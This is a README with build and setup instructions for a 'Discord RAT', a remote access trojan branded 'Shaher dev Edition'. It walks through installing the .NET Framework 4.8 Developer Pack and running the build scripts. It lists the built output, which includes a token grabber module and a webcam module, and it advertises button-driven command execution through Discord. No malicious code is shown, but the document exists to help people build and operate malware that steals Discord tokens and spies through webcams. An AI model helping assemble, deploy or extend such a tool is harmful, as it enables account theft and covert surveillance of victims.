# Setup Requirements - Discord RAT Shaher dev Edition

## Build Error Resolution

The build is currently failing because .NET Framework 4.8 Developer Pack is not installed on your system.

## Required Components

### 1. Install .NET Framework 4.8 Developer Pack
Download and install from: https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48

**OR**

### 2. Alternative: Use Visual Studio Installer
1. Open Visual Studio Installer
2. Click "Modify" on your Visual Studio installation
3. Go to "Individual components" tab
4. Search for ".NET Framework 4.8 targeting pack"
5. Check the box and click "Modify"

## Quick Fix Options

### Option 1: Download and Install .NET Framework 4.8 Developer Pack
```bash
# Download from Microsoft:
# https://dotnet.microsoft.com/en-us/download/dotnet-framework/thank-you/net48-developer-pack-offline-installer
```

### Option 2: Build with Visual Studio IDE
1. Open Visual Studio 2022
2. Open the solution file: `Discord rat\Discord rat.sln`
3. Right-click on the solution in Solution Explorer
4. Select "Build Solution" (Ctrl+Shift+B)

### Option 3: Use NuGet Package Manager (if available)
```bash
# In Package Manager Console:
Install-Package Microsoft.NETFramework.ReferenceAssemblies -Version 1.0.3
```

## After Installing Requirements

Once you have the .NET Framework 4.8 Developer Pack installed, you can run:

```bash
# Using PowerShell:
.\build_release.ps1

# OR using Command Prompt:
.\build.bat
```

## Project Structure After Build

```
build/
├── Discord rat.exe          # Main application
├── modules/
│   ├── Token grabber.dll   # Token grabber module
│   └── Webcam.dll          # Webcam module
└── [other dependencies]
```

## Features of Shaher dev Edition

✅ **Interactive Button Interface** - Modern Discord UI with categorized commands
✅ **Enhanced User Experience** - No need to memorize text commands
✅ **Professional Branding** - Updated with Shaher dev attribution
✅ **Organized Command Structure** - 7 categories for easy navigation
✅ **One-Click Execution** - Simple commands execute with button clicks

---
**Created by: Shaher dev**
**Enhanced Discord RAT with Interactive Button Interface**
